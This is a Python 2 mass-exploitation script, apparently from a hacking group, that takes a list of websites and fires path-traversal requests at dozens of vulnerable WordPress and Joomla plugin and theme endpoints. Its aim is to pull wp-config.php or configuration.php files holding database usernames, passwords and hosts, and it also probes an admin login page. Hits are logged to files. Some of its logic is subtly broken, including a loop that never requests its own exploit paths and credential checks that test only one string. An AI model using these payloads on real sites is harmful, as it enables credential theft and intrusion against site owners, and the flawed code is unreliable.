import httplib, sys, os, time
from platform import system

#Install Pyhon 2. ....  Version
#if u edited Script U  Are Nooob


def clearscr():
    if system() == 'Linux':
        os.system("clear")
    if system() == 'Windows':
        os.system('cls')
        os.system('color a')
    else:
        pass
clearscr()


def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(4. / 100)
print("""
                                   _       _       _    _ _ _ _____
          __ _ _ __ ___   __ _ ___(_) __ _| |__   | | _(_) | |___ / _ __
         / _` | '_ ` _ \ / _` |_  / |/ _` | '_ \  | |/ / | | | |_ \| '__|
        | (_| | | | | | | (_| |/ /| | (_| | | | | |   <| | | |___) | |
         \__,_|_| |_| |_|\__,_/___|_|\__, |_| |_| |_|\_\_|_|_|____/|_|
                                     |___/
        """)
slowprint("\n\t\t\t\t\tCoded By " + "./Trojan Kill3r Amazigh" + "\n\t\t\t\t\t\t            Facebook: fb.com/pow.lsky1")
################ les exploit ####################
#------------------------------------------------------------------------
Samir = "/admin/login"
#----------------------------------------------------------------------------
cherry = "/wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=../../../../../wp-config.php"
#--------------------------------------------------------------------------------------------------
revslider = "/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php"
#----------------------------------------------------------------------------------------
exploit = ["/wp-content/plugins/ajax-store-locator-wordpress_0/sl_file_download.php?download_file=../../../wp-config.php",
            "/wp-content/plugins/filedownload/download.php/?path=../../../wp-config.php",
            "/wp-content/plugins/google-mp3-audio-player/direct_download.php?file=../../../wp-config.php",
            "/wp-content/plugins/pica-photo-gallery/picadownload.php?imgname=../../../wp-config.php",
            "/wp-content/plugins/plugin-newsletter/preview.php?data=../../../../wp-config.php",
            "/wp-content/plugins/simple-download-button-shortcode/simple-download-button_dl.php?file=../../../../wp-config.php",
            "/wp-content/plugins/tinymce-thumbnail-gallery/php/download-image.php?href=../../../../wp-config.php",
            "/wp-content/themes/MichaelCanthony/download.php?file=../../../wp-config.php",
            "/wp-content/themes/Newspapertimes_1/download.php?filename=../../../wp-config.php",
            "/wp-content/themes/SMWF/inc/download.php?file=../../../../wp-config.php",
            "/wp-content/themes/TheLoft/download.php?file=../../../wp-config.php",
            "/wp-content/themes/acento/includes/view-pdf.php?download=1&file=../../../../wp-config.php",
            "/wp-content/themes/corporate_works/downloader.php?file_download=../../../wp-config.php",
            "/wp-content/themes/felis/download.php?file=../../../wp-config.php",
            "/wp-content/themes/jarida/download.php?uri=../../../wp-config.php",
            "/wp-content/themes/lote27/download.php?download=../../../wp-config.php",
            "/wp-content/themes/markant/download.php?file=../../../wp-config.php",
            "/wp-content/themes/parallelus-mingle/framework/utilities/download/getfile.php?file=../../../../../../wp-config.php",
            "/wp-content/themes/parallelus-salutation/framework/utilities/download/getfile.php?file=../../../../../../wp-config.php",
            "/wp-content/themes/tess/download.php?file=../../../wp-config.php",
            "/wp-content/themes/yakimabait/download.php?file=../../../wp-config.php"]
#---------------------------------------------------------------------------

wpforce = "/force-download.php?file=wp-config.php"
#----------------------------------------------------------------------------------
hbaudio = "/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10"
#------------------------------------------------------------------
mthem = "/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php"
#----------------------------------------------------------------------------------
hdf = "/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php"
#------------------------------------------------------------------------------------------
com_cck = "/index.php?option=com_cckjseblod&task=download&file=configuration.php"
#-------------------------------------------------------------------------------------------
com_aceftp = "/administrator/components/com_aceftp/quixplorer/index.php?action=download&dir=&item=configuration.php&order=name&srt=yes"
#------------------------------------------------------------------------------------------
ypo = "/wp-content/themes/ypo-theme/download.php?download=../../../../wp-config.php"
#------------------------------------------------------------------------------------------
com_sprv = "/index.php?option=com_sprv&task=file&file=configuration.php"
#------------------------------------------------------------------------------------------
hmd = "/index.php?comp=download&op=download&file=../includes/hmdconfig.php"
#------------------------------------------------------------------------------------------
chorchup = "/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php"
#------------------------------------------------------------------------------------------
contact = "/wp-content/plugins/website-contact-form-with-file-upload/config.php"
#------------------------------------------------------------------------------------------
com_joomanager = "/index.php?option=com_joomanager&controller=details&task=download&path=configuration.php"
#------------------------------------------------------------------------------------------

try:
    q = raw_input("Entre List Site: ")
    q = open(q, "r")
except:
    print ("Pffffff Entre List Sites  -_-")

for i in q:
    i = i.rstrip()
    try:
        if i[:7] == "http://":
            i = i.replace("http://", "")
        if i[:8] == "https://":
            i = i.replace("https://", "")
        if i[-1] == "/":
            i = i.replace("/", "")
        print ("\t" + i + "      Scaning ..... ")
        for ex in exploit:
            ex = ex.rstrip()
            connex= httplib.HTTPConnection(i)
            connex.request("POST", Samir)
            connex = connex.getresponse()
            htmlex = connex.read()
            if connex.status == 200 and ("DB_USER" and "DB_PASSWORD" and "DB_HOST") in htmlex:
                print(" [ Ex Faund ] :==> "), i + ex
                with open("Faund ex.txt", "a") as ex1:
                    ex1.writelines(i + ex + "\n")
            else:
                print i + ex + ("  ..........[NOT VULN]\n")
################### BYPASS ##########################
        connbypass = httplib.HTTPConnection(i)
        connbypass.request("POST", Samir)
        connbypass = connbypass.getresponse()
        htmlbypass = connbypass.read()
        if connbypass.status == 200 and ('type="password"') in htmlbypass:
            print(" [ ByPass Faund ] :==> "), i+ Samir
            with open("Panel Admin Bypass.txt", "a") as by:
                by.writelines(i + Samir+ "\n")
        else:
            print ("[ByPass]" + "  ..........[NOT VULN]\n")
#################### Config WP Revslider ###########################
        conncherry = httplib.HTTPConnection(i)
        conncherry.request("POST", cherry)
        conncherry = conncherry.getresponse()
        htmlcherry = conncherry.read()
        if conncherry.status == 200 and ("DB_USER" and "DB_PASSWORD" and "DB_HOST") in htmlcherry:
            print(" [ Cherry Plugin Faund ] :==> "), i + cherry
            with open("wordpres_Config.txt", "a") as nb:
                nb.writelines(i + cherry + "\n")
        else:
            print ("[Cherry Plugin]" + "  ..........[NOT VULN]\n")

        connrevs = httplib.HTTPConnection(i)
        connrevs.request("POST", revslider)
        connrevs = connrevs.getresponse()
        htmlrevs = connrevs.read()
        if connrevs.status == 200 and ("DB_USER" and "DB_PASSWORD" and "DB_HOST") in htmlrevs:
            print (" [ Revslider Config Faund ] :==> "), i + revslider
            with open("wordpres_Config.txt", "a") as wp1:
                wp1.writelines(i + revslider + "\n")
        else:
            print ("[Revslider]" + "  ..........[NOT VULN]\n")
######################## WP FORCE #################################
        connwpforce = httplib.HTTPConnection(i)
        connwpforce.request("POST", wpforce)
        connwpforce = connwpforce.getresponse()
        htmlwpforce = connwpforce.read()
        if connwpforce.status == 200 and ("DB_USER" and "DB_PASSWORD" and "DB_HOST") in htmlwpforce:
            print ("WpForce Config Faund ==========> "), i + wpforce
            with open("wordpres_Config.txt", "a") as wp2:
                wp2.writelines(i + wpforce + "\n")
        else:
            print ("[WpForce]" + "  ..........[NOT VULN]\n")
######################## hbaudio ################################
        connhbaudio = httplib.HTTPConnection(i)
        connhbaudio.request("POST", hbaudio)
        connhbaudio = connhbaudio.getresponse()
        htmlhbaudio = connhbaudio.read()
        if connhbaudio.status == 200 and ("DB_USER" and "DB_PASSWORD" and "DB_HOST") in htmlhbaudio:
            print ("HbAudio Config Faund ==========> "), i + hbaudio
            with open("wordpres_Config.txt", "a") as wp3:
                wp3.writelines(i + hbaudio + "\n")
        else:
            print ("[HbAudio]" + "  ..........[NOT VULN]\n")
######################## mthem #################################
        connmthem = httplib.HTTPConnection(i)
        connmthem.request("POST", mthem)
        connmthem = connmthem.getresponse()
        htmlmthem = connmthem.read()
        if connmthem.status == 200 and ("DB_USER" and "DB_PASSWORD" and "DB_HOST") in htmlmthem:
            print ("Mthem Faund ==========> "), i + mthem
            with open("wordpres_Config.txt", "a") as wp4:
                wp4.writelines(i + mthem + "\n")
        else:
            print ("[Mthem]" + "  ..........[NOT VULN]\n")
######################### Ypo Theme #####################################
        connypo = httplib.HTTPConnection(i)
        connypo.request("GET", ypo)
        connypo = connypo.getresponse()
        htmlypo = connypo.read()
        if connypo.status == 200 and ("DB_USER" and "DB_PASSWORD" and "DB_HOST") in htmlypo:
            print("ypo-theme Faund ==========> "), i + ypo
            with open("wordpres_Config.txt", "a") as wp5:
                wp5.writelines(i + ypo + "\n")
        else:
            print ("[ypo-theme]" + "  ..........[NOT VULN]\n")
        ################# churchope #################################
        connchorchupe = httplib.HTTPConnection(i)
        connchorchupe.request("GET", chorchup)
        connchorchupe = connchorchupe.getresponse()
        htmlchorchupe = connchorchupe.read()
        if connchorchupe.status == 200 and ("DB_USER" and "DB_PASSWORD" and "DB_HOST") in htmlchorchupe:
            print("churchope Faund ==========> "), i + chorchup
            with open("wordpres_Config.txt", "a") as wp6:
                wp6.writelines(i + chorchup + "\n")
        else:
            print ("[churchope]" + "  ..........[NOT VULN]\n")

            #########################################################
        conncontact = httplib.HTTPConnection(i)
        conncontact.request("GET", chorchup)
        conncontact = conncontact.getresponse()
        htmlcontact = conncontact.read()
        if conncontact.status == 200 and ("DB_USER" and "DB_PASSWORD" and "DB_HOST") in htmlcontact:
            print("Contact_Form Faund ==========> "), i + contact
            with open("wordpres_Config.txt", "a") as wp7:
                wp7.writelines(i + contact + "\n")
        else:
            print ("[Contact-Form]" + "  ..........[NOT VULN]\n")
#########################################################
##############################################################
##################################################################
############ Com hdflvp ##########################
        connhdflvp = httplib.HTTPConnection(i)
        connhdflvp.request("POST", hdf)
        connhdflvp = connhdflvp.getresponse()
        htmlhdflvp = connhdflvp.read()
        if connhdflvp.status == 200 and ("$user" and "$host" and "$password") in htmlhdflvp:
                print ("hdflvplayer Faund ==========> "), i + hdf
                with open("joomla_config.txt", "a") as jm1:
                    jm1.writelines(i + hdf + "\n")
        else:
            print ("[HdFlvPlayer]" + "  ..........[NOT VULN]\n")
################ com_joomanager #####################
        connjoomanager = httplib.HTTPConnection(i)
        connjoomanager.request("POST", com_joomanager)
        connjoomanager = connjoomanager.getresponse()
        htmljoomanager = connjoomanager.read()
        if connjoomanager.status == 200 and ("$user" and "$host" and "$password") in htmljoomanager:
            print ("Com_Joomanager Faund ==========> "), i + com_joomanager
            with open("joomla_config.txt", "a") as jm6:
                jm6.writelines(i + com_joomanager + "\n")
        else:
            print ("[Com_Joomanager]" + "  ..........[NOT VULN]\n")
############## com_aceftp ####################################
        connaceftp = httplib.HTTPConnection(i)
        connaceftp.request("POST", com_aceftp)
        connaceftp = connaceftp.getresponse()
        htmlaceftp = connaceftp.read()
        if connaceftp.status == 200 and ("$user" and "$host" and "$password") in htmlaceftp:
            print ("Com_Aceftp Faund ==========> "), i + com_aceftp
            with open("joomla_config.txt", "a") as jm2:
                jm2.writelines(i + com_aceftp + "\n")
        print ("[Com_Aceftp]" + "  ..........[NOT VULN]\n")

############### com_cck ###################################################
        conncck = httplib.HTTPConnection(i)
        conncck.request("POST", com_cck)
        conncck = conncck.getresponse()
        htmlcck = conncck.read()
        if conncck.status == 200 and ("$user" and "$host" and "$password") in htmlcck:
            print ("com_cck Faund ==========> "), i + com_cck
            with open("joomla_config.txt", "a") as jm3:
                jm3.writelines(i + com_cck + "\n")
        else:
            print ("[Com_Cck]" + "  ..........[NOT VULN]\n")
###############################################################"
        connsprv = httplib.HTTPConnection(i)
        connsprv.request("GET", com_sprv)
        connsprv = connsprv.getresponse()
        htmlsprv = connsprv.read()
        if connsprv.status == 200 and ("$user" and "$host" and "$password") in htmlsprv:
            print("com_sprv Faund ==========> "), i + com_sprv
            with open("joomla_config.txt", "a") as jm4:
                jm4.writelines(i + com_sprv + "\n")
        else:
            print ("[Com_Sprv]" + "  ..........[NOT VULN]\n")
                #############################################################
        connhmd = httplib.HTTPConnection(i)
        connhmd.request("GET", hmd)
        connhmd = connhmd.getresponse()
        htmlhmd = connhmd.read()
        if connhmd.status == 200 and ("$dbname" and "$dbhost" and "$dbpass") in htmlhmd:
            print("hmdconfig Faund ==========> "), i + hmd
            with open("Cms_config.txt", "a") as jm5:
                jm5.writelines(i + hmd + "\n")
        else:
            print ("[Cms_Config]" + "  ..........[NOT VULN]\n")



    except:
        pass
print(" -- We Are Amazigh Hacker And Enjoy My Friend Samir Sakhraoui  and Zohir   ^_^ -- ")
